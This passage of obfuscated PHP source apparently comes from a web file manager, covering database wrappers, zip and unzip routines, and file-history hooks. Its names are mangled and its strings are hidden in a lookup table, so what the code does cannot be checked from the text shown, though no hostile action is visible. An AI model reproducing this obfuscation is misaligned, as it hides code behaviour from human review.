str_ireplace($Š»±‘[58], $Š»±‘[59], $Ü˜Ñöµƒ); } } protected function parseValue($ˆœÉ®–¶) { $®Ìƒî­¤ =& $_SERVER[®»±”ó²]; if (is_string($ˆœÉ®–¶)) { $¥¿Æ¸ûÄ = strpos($ˆœÉ®–¶, $®Ìƒî­¤[4]) === 0 && in_array($ˆœÉ®–¶, array_keys($this->bind)); $ˆœÉ®–¶ = $¥¿Æ¸ûÄ ? $this->escapeString($ˆœÉ®–¶) : $®Ìƒî­¤[1044] . $this->escapeString($ˆœÉ®–¶) . $®Ìƒî­¤[1044]; } elseif (isset($ˆœÉ®–¶[0]) && is_string($ˆœÉ®–¶[0]) && strtolower($ˆœÉ®–¶[0]) == $®Ìƒî­¤[374]) { $ˆœÉ®–¶ = $this->escapeString($ˆœÉ®–¶[1]); } elseif (is_array($ˆœÉ®–¶)) { $ˆœÉ®–¶ = array_map(array($this, $®Ìƒî­¤[1045]), $ˆœÉ®–¶); } elseif (is_bool($ˆœÉ®–¶)) { $ˆœÉ®–¶ = $ˆœÉ®–¶ ? $®Ìƒî­¤[91] : $®Ìƒî­¤[231]; } elseif (is_null($ˆœÉ®–¶)) { $ˆœÉ®–¶ = $®Ìƒî­¤[106]; } return $ˆœÉ®–¶; } public function getLastInsertId() { $öé¥¼÷’ =& $_SERVER[®»±”ó²]; switch ($this->dbType) { case $öé¥¼÷’[1031]: case $öé¥¼÷’[1023]: case $öé¥¼÷’[1004]: case $öé¥¼÷’[1022]: case $öé¥¼÷’[1006]: case $öé¥¼÷’[1034]: return $this->_linkID->lastInsertId(); case $öé¥¼÷’[1005]: case $öé¥¼÷’[1007]: $õ‘ï¹¦° = $this->table; $ª£úïóŠ = $this->query("\x53\105\114\x45\x43\x54\40{$õ‘ï¹¦°}\56\143\x75\162\x72\166\141\x6c\x20\143\165\162\162\x76\141\154\x20\106\x52\117\115\40\144\165\141\x6c"); return $ª£úïóŠ ? $ª£úïóŠ[0][$öé¥¼÷’[1046]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($–‘ıâî¤) { $õ¯¢Áø§ =& $_SERVER[®»±”ó²]; if (!CacheLock::fileLock($õ¯¢Áø§[13])) { return !1; } $Õí˜¶ã = parent::query($–‘ıâî¤); CacheLock::fileUnLock($õ¯¢Áø§[13]); return $Õí˜¶ã; } public function execute($º¥ó‡»Å) { $şÃ˜±Û =& $_SERVER[®»±”ó²]; if (!CacheLock::fileLock($şÃ˜±Û[13])) { return !1; } $ÎáÖÄ¥ğ = parent::execute($º¥ó‡»Å); CacheLock::fileUnLock($şÃ˜±Û[13]); return $ÎáÖÄ¥ğ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ç‘—Äïò) { $Õıò÷¹¯ =& $_SERVER[®»±”ó²]; if (!CacheLock::fileLock($Õıò÷¹¯[13])) { return !1; } $ÔáĞ‡Á‹ = parent::query($ç‘—Äïò); CacheLock::fileUnLock($Õıò÷¹¯[13]); return $ÔáĞ‡Á‹; } public function execute($ÑÔÁ«‚Â) { $‚÷€ÎÍ² =& $_SERVER[®»±”ó²]; if (!CacheLock::fileLock($‚÷€ÎÍ²[13])) { return !1; } $ÅÛøºã• = parent::execute($ÑÔÁ«‚Â); CacheLock::fileUnLock($‚÷€ÎÍ²[13]); return $ÅÛøºã•; } } goto cìºƒáºèø; DÕšÅâº—“: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ş•ßŸ½–; if ($Ş•ßŸ½–) { return $Ş•ßŸ½–; } $²‚ÔÛÈ = IO::init($_SERVER[®»±”ó²][8]); return $²‚ÔÛÈ; } private static function iconvSystem($¬˜´‚ì¸) { return self::local()->iconvSystem($¬˜´‚ì¸); } private static function iconvApp($éşÔ¸¨µ) { return self::local()->iconvApp($éşÔ¸¨µ); } public static function zipFolder($¥ÌåĞÊÏ, $ƒÔÁ³¿¾ = "\172\x69\160", $˜òÖÇ³Ç = '', $ø¹è³Š­ = REPEAT_RENAME) { $­ãÃ£óé =& $_SERVER[®»±”ó²]; $­È·æÕÊ = IO::listPath($¥ÌåĞÊÏ); if (!$­È·æÕÊ) { return !1; } $­È·æÕÊ = array_merge($­È·æÕÊ[$­ãÃ£óé[85]], $­È·æÕÊ[$­ãÃ£óé[86]]); return self::zip($­È·æÕÊ, $ƒÔÁ³¿¾, $˜òÖÇ³Ç, $ø¹è³Š­); } public static function zip($¼ß—Ô», $Ï®ÆĞÜ = "\x7a\151\160", $‰³Äâæ = '', $»„Ò µÍ = REPEAT_RENAME) { $½’…é =& $_SERVER[®»±”ó²]; if (is_string($¼ß—Ô») && $¼ß—Ô») { $¼ß—Ô» = array(array($½’…é[87] => $¼ß—Ô»)); } $Ú»§¿¶ô = self::init($¼ß—Ô»[0][$½’…é[87]]); $¥ªØÜ = self::info($¼ß—Ô»[0][$½’…é[87]]); $ç€½§ãø = $½’…é[12]; $à‡™¹‰Ö = $½’…é[12]; $ì¥ï¨°Ÿ = $½’…é[12]; if ($‰³Äâæ && substr($‰³Äâæ, -1, 1) != $½’…é[8]) { $à‡™¹‰Ö = get_path_father($‰³Äâæ); $ì¥ï¨°Ÿ = get_path_this($‰³Äâæ); } else { $à‡™¹‰Ö = self::pathFather($¥ªØÜ[$½’…é[87]]); $ì¥ï¨°Ÿ = $¥ªØÜ[$½’…é[32]] . $½’…é[10] . $Ï®ÆĞÜ; if (count($¼ß—Ô») > 1) { $ÅÊä¥Ü¦ = IO::info($à‡™¹‰Ö); $ì¥ï¨°Ÿ = $ÅÊä¥Ü¦[$½’…é[32]] . $½’…é[10] . $Ï®ÆĞÜ; } if ($‰³Äâæ) { $à‡™¹‰Ö = $‰³Äâæ; } } if ($Ú»§¿¶ô->getType() == $½’…é[109]) { $–«Àã•ï = self::init($à‡™¹‰Ö); $Ê¾—‰ª = $–«Àã•ï->getType() == $½’…é[109] ? $à‡™¹‰Ö : get_path_father($Ú»§¿¶ô->path); $Ê¾—‰ª = IO::getPathInner($Ê¾—‰ª); $Ê¾—‰ª = rtrim($Ê¾—‰ª, $½’…é[8]) . $½’…é[8]; mk_dir($Ê¾—‰ª); } else { $ç€½§ãø = TEMP_FILES . $½’…é[1277] . time() . rand_string(8) . $½’…é[8]; mk_dir($ç€½§ãø); file_put_contents($ç€½§ãø . $½’…é[1278], $½’…é[12]); $Ê¾—‰ª = $ç€½§ãø; } $ï®¬™ëÚ = IO::info($Ê¾—‰ª); if (!$ï®¬™ëÚ || !$ï®¬™ëÚ[$½’…é[236]]) { show_json(LNG($½’…é[1279]), !1); } $Ê¿Ë˜İé = self::zipFileList($¼ß—Ô», $ç€½§ãø); foreach ($Ê¿Ë˜İé as $ßÀŒ‹‡ => $ÚùÔˆÓÉ) { $Ê¿Ë˜İé[$ßÀŒ‹‡] = self::iconvSystem($ÚùÔˆÓÉ); } $ùŸç¨İ = get_filename_auto($Ê¾—‰ª . $ì¥ï¨°Ÿ, $½’…é[12], $»„Ò µÍ); KodArchive::create(self::iconvSystem($ùŸç¨İ), $Ê¿Ë˜İé); if (!IO::exist($ùŸç¨İ)) { if ($ç€½§ãø) { del_dir($ç€½§ãø); } write_log($½’…é[1280] . $ùŸç¨İ, $½’…é[390]); show_json(LNG($½’…é[1281]), !1); } if (!$ç€½§ãø) { return $ùŸç¨İ; } $³½‡îÈû = self::move($ùŸç¨İ, $à‡™¹‰Ö, $»„Ò µÍ); if ($ç€½§ãø) { del_dir($ç€½§ãø); } if (!$ùŸç¨İ) { write_log($½’…é[1282] . $ùŸç¨İ . $½’…é[1283] . $à‡™¹‰Ö, $½’…é[390]); show_json(LNG($½’…é[1281]), !1); } return $³½‡îÈû; } public static function unzip($æÅ€ËÏÄ, $À‚Ìœ³Õ, $åöĞ‚ƒı = "\x2d\x31", $ó»ÑÙÂè = "\162\145\160\154\141\143\x65") { $‘æÌÔ£ =& $_SERVER[®»±”ó²]; $è¦Ô­Ûü = parent::info($æÅ€ËÏÄ); if (!$è¦Ô­Ûü) { show_json(LNG($‘æÌÔ£[1284]), !1); } $××ƒ—éº = IO::infoFullSimple($À‚Ìœ³Õ); if (!$××ƒ—éº) { $À‚Ìœ³Õ = IO::mkdir($À‚Ìœ³Õ); } if (isset($××ƒ—éº[$‘æÌÔ£[194]]) && trim($××ƒ—éº[$‘æÌÔ£[87]], $‘æÌÔ£[8]) != trim($À‚Ìœ³Õ, $‘æÌÔ£[8])) { $Ø©ˆ”›Ğ = KodIO::make($××ƒ—éº[$‘æÌÔ£[193]]); $™¹ôµÚ¦ = IO::fileNameAuto($Ø©ˆ”›Ğ, $××ƒ—éº[$‘æÌÔ£[32]], REPEAT_RENAME_FOLDER, !0); $À‚Ìœ³Õ = IO::mkdir($Ø©ˆ”›Ğ . $™¹ôµÚ¦); } $åöĞ‚ƒı = $åöĞ‚ƒı && $åöĞ‚ƒı != $‘æÌÔ£[1285] ? @json_decode($åöĞ‚ƒı, !0) : -1; $×ø¥³ñ‹ = self::unzipPart($æÅ€ËÏÄ, $åöĞ‚ƒı); if (!$×ø¥³ñ‹ || !IO::exist($×ø¥³ñ‹[$‘æÌÔ£[233]])) { show_json(LNG($‘æÌÔ£[108]), !1); } $á€á©ş¼ = $×ø¥³ñ‹[$‘æÌÔ£[1286]][count($×ø¥³ñ‹[$‘æÌÔ£[1286]]) - 1]; if ($á€á©ş¼[$‘æÌÔ£[1287]] == -1 || substr($á€á©ş¼[$‘æÌÔ£[32]], -1, 1) == $‘æÌÔ£[8]) { $ş¿ÔÙ¥Ñ = $×ø¥³ñ‹[$‘æÌÔ£[1288]] . rand_string(10) . $‘æÌÔ£[8]; mk_dir($ş¿ÔÙ¥Ñ); $»—¾€Ïç = count($×ø¥³ñ‹[$‘æÌÔ£[1286]]) == 1 ? IO::ext($æÅ€ËÏÄ) : get_path_ext($×ø¥³ñ‹[$‘æÌÔ£[233]]); $ö‰şÏ = KodArchive::extract(self::iconvSystem($×ø¥³ñ‹[$‘æÌÔ£[233]]), $ş¿ÔÙ¥Ñ, $á€á©ş¼[$‘æÌÔ£[1287]], $™¹ôµÚ¦, $»—¾€Ïç); self::unzipErrorCheck($ö‰şÏ, array($‘æÌÔ£[1289], $æÅ€ËÏÄ, $»—¾€Ïç, $À‚Ìœ³Õ, $×ø¥³ñ‹)); Hook::trigger($‘æÌÔ£[1290], $ş¿ÔÙ¥Ñ); recursion_dir($ş¿ÔÙ¥Ñ, $«ğ¸’Üô, $ŠÁ¼¶Á¹, 0); $…­öãÑ = array_merge($«ğ¸’Üô, $ŠÁ¼¶Á¹); $šäƒ´Ş = array(); foreach ($…­öãÑ as $ÏŸêµ¬Œ) { $ªÚ©çÒ‘ = IO::move(self::iconvApp($ÏŸêµ¬Œ), $À‚Ìœ³Õ, $ó»ÑÙÂè); if ($ªÚ©çÒ‘) { $šäƒ´Ş[] = $ªÚ©çÒ‘; } } del_dir($ş¿ÔÙ¥Ñ); } else { $ªÚ©çÒ‘ = IO::move($×ø¥³ñ‹[$‘æÌÔ£[233]], $À‚Ìœ³Õ, $ó»ÑÙÂè, get_path_this($á€á©ş¼[$‘æÌÔ£[32]])); if ($ªÚ©çÒ‘) { $šäƒ´Ş[] = $ªÚ©çÒ‘; } } return $šäƒ´Ş ? $šäƒ´Ş : !1; } public static function unzipList($»ô¬íÌß) { $ä­¨Ñöé =& $_SERVER[®»±”ó²]; $İ¨ç†¸Ğ = isset($»ô¬íÌß[$ä­¨Ñöé[1291]]) ? $»ô¬íÌß[$ä­¨Ñöé[1291]] : !1; $˜¶ãÚäÉ = isset($»ô¬íÌß[$ä­¨Ñöé[1287]]) ? @json_decode($»ô¬íÌß[$ä­¨Ñöé[1287]], !0) : -1; $®ÉàïúÖ = self::unzipPart($»ô¬íÌß[$ä­¨Ñöé[87]], $˜¶ãÚäÉ); if (!$®ÉàïúÖ || !IO::exist($®ÉàïúÖ[$ä­¨Ñöé[233]])) { show_json(LNG($ä­¨Ñöé[108]), !1); } $”¼÷Ô = $®ÉàïúÖ[$ä­¨Ñöé[1286]][count($®ÉàïúÖ[$ä­¨Ñöé[1286]]) - 1]; $·ÊÊ«Ä» = in_array(IO::ext($®ÉàïúÖ[$ä­¨Ñöé[233]]), array($ä­¨Ñöé[390], $ä­¨Ñöé[1292], $ä­¨Ñöé[1293], $ä­¨Ñöé[1294], $ä­¨Ñöé[1295], $ä­¨Ñöé[1296])); if (!$İ¨ç†¸Ğ && ($”¼÷Ô[$ä­¨Ñöé[1287]] == -1 || $·ÊÊ«Ä»)) { $Åáß¤ÚÖ = $®ÉàïúÖ[$ä­¨Ñöé[1288]] . get_path_this($®ÉàïúÖ[$ä­¨Ñöé[233]]) . $ä­¨Ñöé[1297]; if (!IO::exist($Åáß¤ÚÖ)) { $ˆµÇÁ¶¼ = $”¼÷Ô[$ä­¨Ñöé[1287]] == -1 ? get_path_ext(IO::pathThis($»ô¬íÌß[$ä­¨Ñöé[87]])) : get_path_ext($®ÉàïúÖ[$ä­¨Ñöé[233]]); $ƒ³çÎí = KodArchive::listContent(self::iconvSystem($®ÉàïúÖ[$ä­¨Ñöé[233]]), !0, $ˆµÇÁ¶¼); self::unzipErrorCheck($ƒ³çÎí, array($ä­¨Ñöé[1298], $»ô¬íÌß, $®ÉàïúÖ)); @file_put_contents($Åáß¤ÚÖ, json_encode($ƒ³çÎí[$ä­¨Ñöé[1299]])); } return @json_decode(IO::getContent($Åáß¤ÚÖ), !0); } IO::fileOut($®ÉàïúÖ[$ä­¨Ñöé[233]], $İ¨ç†¸Ğ, get_path_this($”¼÷Ô[$ä­¨Ñöé[32]])); die; } private static function zipFileList($ïó‹ç´›, $È÷©ÎŞ‘ = false) { $õê˜Ÿí· =& $_SERVER[®»±”ó²]; $œŞ˜¹½· = array(); foreach ($ïó‹ç´› as $ÆÇì‘·¶) { $†ŸÓŞ¯‘ = $ÆÇì‘·¶[$õê˜Ÿí·[87]]; if ($È÷©ÎŞ‘) { $†ŸÓŞ¯‘ = self::copy($ÆÇì‘·¶[$õê˜Ÿí·[87]], $È÷©ÎŞ‘, $õê˜Ÿí·[905]); } else { $†¯âİ÷ó = self::init($ÆÇì‘·¶[$õê˜Ÿí·[87]]); if ($†¯âİ÷ó->getType() == $õê˜Ÿí·[109]) { $†ŸÓŞ¯‘ = $†¯âİ÷ó->path; } } if ($†ŸÓŞ¯‘ && self::local()->exist($†ŸÓŞ¯‘)) { $œŞ˜¹½·[$ÆÇì‘·¶[$õê˜Ÿí·[87]]] = $†ŸÓŞ¯‘; } } if (!empty($œŞ˜¹½·)) { return array_values($œŞ˜¹½·); } show_json(LNG($õê˜Ÿí·[1256]), !1); } private static function localFilePath($¨¯åòµÉ) { $ºßÄÂÖ© =& $_SERVER[®»±”ó²]; $ÁÚ³ÀÇÂ = KodIO::parse($¨¯åòµÉ); if ($ÁÚ³ÀÇÂ[$ºßÄÂÖ©[33]] == KodIO::KOD_SOURCE) { $©½—ûï§ = Model($ºßÄÂÖ©[911])->fileInfoGet(KodIO::sourceID($¨¯åòµÉ)); if (!$©½—ûï§[$ºßÄÂÖ©[87]]) { show_json($ºßÄÂÖ©[1300], !1); } $¨¯åòµÉ = $©½—ûï§[$ºßÄÂÖ©[87]]; } $§ŠäÆ® = self::init($¨¯åòµÉ); if ($§ŠäÆ®->pathParse[$ºßÄÂÖ©[1242]]) { $¨¯åòµÉ = $§ŠäÆ®->pathParse[$ºßÄÂÖ©[1242]]; $§ŠäÆ® = self::init($¨¯åòµÉ); } $ä£Ÿóæš = $§ŠäÆ®->getType(); if ($ä£Ÿóæš == $ºßÄÂÖ©[109] || $ä£Ÿóæš == $ºßÄÂÖ©[1301]) { if (!$§ŠäÆ®->exist($§ŠäÆ®->path)) { show_json(LNG($ºßÄÂÖ©[108]), !1); } return $§ŠäÆ®->path; } return !1; } public static function unzipPart($¸ü±Œ›, $©·‘Äüõ = -1) { $úêôÙòÀ =& $_SERVER[®»±”ó²]; $³€á´ŠØ = IO::pathThis($¸ü±Œ›); if (!$©·‘Äüõ || $©·‘Äüõ == -1) { $ë˜©Ø ± = array(array($úêôÙòÀ[32] => $³€á´ŠØ, $úêôÙòÀ[1287] => -1)); $ë˜©Ø ±[0][$úêôÙòÀ[1302]] = $ë˜©Ø ±[0][$úêôÙòÀ[32]]; } else { if (is_array($©·‘Äüõ)) { $ë˜©Ø ± = $©·‘Äüõ; $è™í†¯ = count($ë˜©Ø ±) - 1; for ($€¾¥øÑâ = 0; $€¾¥øÑâ <= $è™í†¯; $€¾¥øÑâ++) { $›û„ëš„ = $ë˜©Ø ±[$€¾¥øÑâ]; $ ¹åü¾† = get_path_this($›û„ëš„[$úêôÙòÀ[32]]) . (checkExtSafe($›û„ëš„[$úêôÙòÀ[32]]) ? $úêôÙòÀ[12] : $úêôÙòÀ[1303]); $ë˜©Ø ±[$€¾¥øÑâ][$úêôÙòÀ[1302]] = $úêôÙòÀ[1304] . intval($›û„ëš„[$úêôÙòÀ[1287]]) . $úêôÙòÀ[464] . $ ¹åü¾†; if ($€¾¥øÑâ == 0) { continue; } $ë˜©Ø ±[$€¾¥øÑâ][$úêôÙòÀ[1302]] = $ë˜©Ø ±[$€¾¥øÑâ - 1][$úêôÙòÀ[1302]] . $úêôÙòÀ[1305] . $ë˜©Ø ±[$€¾¥øÑâ][$úêôÙòÀ[1302]]; } } } if (!is_array($ë˜©Ø ±) || count($ë˜©Ø ±) == 0) { return !1; } $Ò—Şñ™ = $ë˜©Ø ±[count($ë˜©Ø ±) - 1]; if (!IO::exist($¸ü±Œ›)) { return !1; } $À°¬Ì’’ = TEMP_FILES . $úêôÙòÀ[1306] . kodIO::hashPathSafe($¸ü±Œ›) . $úêôÙòÀ[8]; $êÁş¶º = $À°¬Ì’’ . $Ò—Şñ™[$úêôÙòÀ[1302]]; mk_dir($À°¬Ì’’); file_put_contents(TEMP_FILES . $úêôÙòÀ[1278], $úêôÙòÀ[12]); if (IO::exist($êÁş¶º)) { return array($úêôÙòÀ[233] => $êÁş¶º, $úêôÙòÀ[1286] => $ë˜©Ø ±, $úêôÙòÀ[1288] => $À°¬Ì’’); } $ùÑÑ©Š¯ = self::localFilePath($¸ü±Œ›); if (!$ùÑÑ©Š¯) { $ùÑÑ©Š¯ = $À°¬Ì’’ . $úêôÙòÀ[1307]; if (!IO::exist($ùÑÑ©Š¯)) { self::copy($¸ü±Œ›, $À°¬Ì’’, !1, get_path_this($ùÑÑ©Š¯)); } } if (!$ùÑÑ©Š¯ || !IO::exist($ùÑÑ©Š¯)) { return !1; } if ($Ò—Şñ™[$úêôÙòÀ[1287]] == -1) { return array($úêôÙòÀ[233] => $ùÑÑ©Š¯, $úêôÙòÀ[1286] => $ë˜©Ø ±, $úêôÙòÀ[1288] => $À°¬Ì’’); } $üùç´¶ = $ùÑÑ©Š¯; foreach ($ë˜©Ø ± as $€¾¥øÑâ => $›û„ëš„) { if (!$›û„ëš„ || $›û„ëš„[$úêôÙòÀ[1287]] == $úêôÙòÀ[1285]) { break; } if (substr($›û„ëš„[$úêôÙòÀ[32]], -1, 1) == $úêôÙòÀ[8]) { break; } $¦Š¼Ã¼á = in_array(get_path_ext($›û„ëš„[$úêôÙòÀ[1302]]), array($úêôÙòÀ[390], $úêôÙòÀ[1292], $úêôÙòÀ[1293], $úêôÙòÀ[1294], $úêôÙòÀ[1295], $úêôÙòÀ[1296])); $µïóïâÈ = $€¾¥øÑâ == count($ë˜©Ø ±) - 1 && $¦Š¼Ã¼á; $çì‘ßåõ = $À°¬Ì’’ . $›û„ëš„[$úêôÙòÀ[1302]]; $ö®ÔÃ½¸ = $À°¬Ì’’ . get_path_this($›û„ëš„[$úêôÙòÀ[32]]); if (IO::exist($çì‘ßåõ)) { $üùç´¶ = $çì‘ßåõ; continue; } $½¿ÙÁâñ = $€¾¥øÑâ == 0 ? get_path_ext($³€á´ŠØ) : get_path_ext($üùç´¶); $ØŒ×ÇğÛ = KodArchive::extract(self::iconvSystem($üùç´¶), $À°¬Ì’’, $›û„ëš„[$úêôÙòÀ[1287]], $˜”ÒÃÒå, $½¿ÙÁâñ); self::unzipErrorCheck($ØŒ×ÇğÛ, array($úêôÙòÀ[1308], $¸ü±Œ›, $ë˜©Ø ±, $›û„ëš„, $çì‘ßåõ)); if (IO::exist($ö®ÔÃ½¸)) { IO::rename($ö®ÔÃ½¸, get_path_this($çì‘ßåõ)); } $üùç´¶ = $çì‘ßåõ; } $êÁş¶º = $üùç´¶; return array($úêôÙòÀ[233] => $üùç´¶, $úêôÙòÀ[1286] => $ë˜©Ø ±, $úêôÙòÀ[1288] => $À°¬Ì’’); } private static function unzipErrorCheck($µ¬·™éí, $µ§‘ŞÉ = false) { $×çª‰Û =& $_SERVER[®»±”ó²]; if ($µ¬·™éí[$×çª‰Û[1309]]) { return !0; } write_log(array($×çª‰Û[1310], $µ¬·™éí, $µ§‘ŞÉ), $×çª‰Û[1311]); $è±ÛßÚ¡ = is_array($µ¬·™éí[$×çª‰Û[1299]]) ? json_encode($µ¬·™éí[$×çª‰Û[1299]]) : $µ¬·™éí[$×çª‰Û[1299]]; show_json($×çª‰Û[1312] . $è±ÛßÚ¡, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ïñØ‚ =& $_SERVER[®»±”ó²]; $ÀÖ»ŞÃ = $GLOBALS[$ïñØ‚[6]][$ïñØ‚[92]]; if ($ÀÖ»ŞÃ[$ïñØ‚[1313]] != 1) { return; } if ($ÀÖ»ŞÃ[$ïñØ‚[1314]] <= 0) { return; } if (isset($_REQUEST[$ïñØ‚[1315]]) && $_REQUEST[$ïñØ‚[1315]] == $ïñØ‚[91]) { return; } Hook::bind($ïñØ‚[1316], $ïñØ‚[1317]); Hook::bind($ïñØ‚[1318], $ïñØ‚[1319]); Hook::bind($ïñØ‚[1320], $ïñØ‚[1321]); Hook::bind($ïñØ‚[1322], $ïñØ‚[1323]); Hook::bind($ïñØ‚[1324], $ïñØ‚[1325]); Hook::bind($ïñØ‚[1326], $ïñØ‚[1327]); } public static function eventBeforeUpload($œ±İÛäŒ) { if ($œ±İÛäŒ[3] && $œ±İÛäŒ[3] != REPEAT_REPLACE) { return; } $˜‚¾•çº = self::parsePath($œ±İÛäŒ[0]); if (!$˜‚¾•çº) { return; } self::add($˜‚¾•çº); } public static function eventBeforeEdit($…ËÃÌ–) { $¢âÃû®š = self::parsePath($…ËÃÌ–[0]); if (!$¢âÃû®š) { return; } self::add($¢âÃû®š); } public static function eventBeforeCopyFile($Ğ×ıë§, $ìÀÆç×Æ, $œû¸Ã¹¿, $¹¾ìÒæ, $¾Š˜­ì¦, $ªúğ³âË) { $À©ÎîŒ¾ =& $_SERVER[®»±”ó²]; if (isset($œû¸Ã¹¿->_data[$À©ÎîŒ¾[1246]]) && $œû¸Ã¹¿->_data[$À©ÎîŒ¾[1246]]) { return; } $ó–àËŞ = $œû¸Ã¹¿->getPathOuter($¹¾ìÒæ); $ªØÜÙ†„ = self::parsePath($ó–àËŞ); if (!$ªØÜÙ†„) { return; } self::add($ªØÜÙ†„); } public static function eventBeforeRename($Õè…›Œ) { $Š¤•¦å =& $_SERVER[®»±”ó²]; $—ì‡éåè = self::parsePath($Õè…›Œ[0]); if (!$—ì‡éåè) { return; } $ÇêŒ¶ = self::checkInHistory($—ì‡éåè); if (!$ÇêŒ¶) { return; } if ($ÇêŒ¶[$Š¤•¦å[33]] == $Š¤•¦å[233]) { $À®ÈÊÍÆ = self::listData($—ì‡éåè); if ($À®ÈÊÍÆ && $À®ÈÊÍÆ[$Š¤•¦å[447]]) { self::moveHistory($—ì‡éåè, $Õè…›Œ[1]); } } else { IO::rename($ÇêŒ¶[$Š¤•¦å[87]], $Õè…›Œ[1]); } } public static function eventBeforeMove($¨†×æ¾Ã) { $´¼ö©ğ© =& $_SERVER[®»±”ó²]; $à¾“á¡ª = self::parsePath($¨†×æ¾Ã[0]); if (!$à¾“á¡ª) { return; } $çÁ¬´İ¯ = self::parsePath($¨†×æ¾Ã[1]); if (!$çÁ¬´İ¯) { return; } $Îşêí› = $¨†×æ¾Ã[3]; $¼÷Çâ½ú = self::checkInHistory($à¾“á¡ª); if (!$¼÷Çâ½ú) { return; } $ÜºÀ×îí = self::pathHistory($çÁ¬´İ¯); if ($¼÷Çâ½ú[$´¼ö©ğ©[33]] == $´¼ö©ğ©[233]) { $å«÷À”ş = self::listData($à¾“á¡ª); $ÂÖ÷ğã = rtrim($çÁ¬´İ¯, $´¼ö©ğ©[8]) . $´¼ö©ğ©[8] . ($Îşêí› ? $Îşêí› : get_path_this($à¾“á¡ª)); $à¤»ğ˜ó = self::listData($ÂÖ÷ğã); if ($å«÷À”ş && $å«÷À”ş[$´¼ö©ğ©[447]] && $à¤»ğ˜ó && $à¤»ğ˜ó[$´¼ö©ğ©[447]]) { return self::clear($à¾“á¡ª); } if ($å«÷À”ş && $å«÷À”ş[$´¼ö©ğ©[447]]) { self::moveHistory($à¾“á¡ª, $Îşêí›, $ÜºÀ×îí); } } else { IO::move($¼÷Çâ½ú[$´¼ö©ğ©[87]], $ÜºÀ×îí, !1, $Îşêí›); self::clearEmptyFolder(IO::pathFather($¼÷Çâ½ú[$´¼ö©ğ©[87]])); } } public static function eventAfterRemove($²º¨ááê, $§Ù¢ìş®) { $‚õµ”èó =& $_SERVER[®»±”ó²]; if (!$§Ù¢ìş®) { return; } $®è¼¶šà = self::parsePath($²º¨ááê[0]); if (!$®è¼¶šà) { return; } $¿»ï¤À“ = self::checkInHistory($®è¼¶šà); if (!$¿»ï¤À“) { return; } if ($¿»ï¤À“[$‚õµ”èó[33]] == $‚õµ”èó[233]) { $šõœ¢˜ = self::listData($®è¼¶šà, !1); if ($šõœ¢˜ && $šõœ¢˜[$‚õµ”èó[447]]) { self::clear($®è¼¶šà, !1); } } else { IO::remove($¿»ï¤À“[$‚õµ”èó[87]]); self::clearEmptyFolder(IO::pathFather($¿»ï¤À“[$‚õµ”èó[87]])); } } private static function checkInHistory($Û¡ÔÒéû) { $Éâ•›½© = self::pathHistory($Û¡ÔÒéû); if (!IO::exist($Éâ•›½©)) { $Éâ•›½© .= $_SERVER[®»±”ó²][1328]; } return IO::exist($Éâ•›½©) ? IO::info($Éâ•›½©) : !1; } private static function parsePath($¶¢¦Œ¬) { $©ğå»ìî =& $_SERVER[®»±”ó²]; if (!$¶¢¦Œ¬) { return !1; } if (isset($GLOBALS[$©ğå»ìî[1329]]) && $GLOBALS[$©ğå»ìî[1329]]) { return; } $Ùëæ—Õã = KodIO::parse($¶¢¦Œ¬); $ÒéÛ†Æ = $Ùëæ—Õã[$©ğå»ìî[33]]; $ıö‡î£ = !$ÒéÛ†Æ || $ÒéÛ†Æ == KodIO::KOD_IO || $ÒéÛ†Æ == KodIO::KOD_SHARE_ITEM; if (!$ıö‡î£ || !$Ùëæ—Õã[$©ğå»ìî[1330]]) { return !1; } if (substr($¶¢¦Œ¬, 0, strlen(DATA_PATH . $©ğå»ìî[1331])) == DATA_PATH . $©ğå»ìî[1331]) { return !1; } if ($ÒéÛ†Æ == KodIO::KOD_SHARE_ITEM) { $»•¶ş«£ = IO::init($¶¢¦Œ¬); if ($»•¶ş«£->pathParse[$©ğå»ìî[1242]]) { return self::parsePath($»•¶ş«£->pathParse[$©ğå»ìî[1242]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $æ¬Á‚ìÎ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $©ğå»ìî[1332]); foreach ($æ¬Á‚ìÎ as $ä‚ˆ«) { if (!$ÒéÛ†Æ && substr($¶¢¦Œ¬, 0, strlen($ä‚ˆ«)) == $ä‚ˆ«) { return !1; } } self::log($GLOBALS[$©ğå»ìî[1237]] . $©ğå»ìî[1333] . $¶¢¦Œ¬); return $¶¢¦Œ¬; } private static function pathHistory($•ØòØï) { $æ‚õß =& $_SERVER[®»±”ó²]; $æú–¿å¯ = self::$_historyBase . ltrim(KodIO::clear($•ØòØï), $æ‚õß[8]); $æú–¿å¯ = str_replace(array($æ‚õß[1334]), array($æ‚õß[1335]), $æú–¿å¯); return $æú–¿å¯; } public static function log($¶°‹»Îœ) { } public static function historyCount($¾éâÄ) { $’Ê®¯“Ë =& $_SERVER[®»±”ó²]; $ë’’»Ğ = array(); $©ÌÖªş = array(); foreach ($¾éâÄ as $ù–ÍùÍŒ) { $ä­°Ø· = get_path_father($ù–ÍùÍŒ); if (!$©ÌÖªş[$ä­°Ø·]) { $©ÌÖªş[$ä­°Ø·] = array(); } $©ÌÖªş[$ä­°Ø·][] = get_path_this($ù–ÍùÍŒ); } foreach ($©ÌÖªş as $ä­°Ø· => $¡Òâ÷ìÒ) { $£–äúğƒ = self::parsePath($ä­°Ø·); if (!$£–äúğƒ) { continue; } foreach ($¡Òâ÷ìÒ as $µàÒ¼¸) { $­¤æšƒÒ = self::listData(rtrim($£–äúğƒ, $’Ê®¯“Ë[8]) . $’Ê®¯“Ë[8] . $µàÒ¼¸, !1); if ($­¤æšƒÒ && $­¤æšƒÒ[$’Ê®¯“Ë[447]]) { $ë’’»Ğ[rtrim($ä­°Ø·, $’Ê®¯“Ë[8]) . $’Ê®¯“Ë[8] . $µàÒ¼¸] = count($­¤æšƒÒ[$’Ê®¯“Ë[447]]); } } } return $ë’’»Ğ; } public static function add($ñ®¥òİ) { $—ñ¼ùŠç =& $_SERVER[®»±”ó²]; $Âø©ŠÍ = self::listData($ñ®¥òİ); if (!$Âø©ŠÍ) { return; } $ŒÌËƒŸ” = Model($—ñ¼ùŠç[851])->get($—ñ¼ùŠç[1336]); $å¤÷Àö‹ = intval($GLOBALS[$—ñ¼ùŠç[6]][$—ñ¼ùŠç[92]][$—ñ¼ùŠç[1314]]); $ÃŸ‡ß = 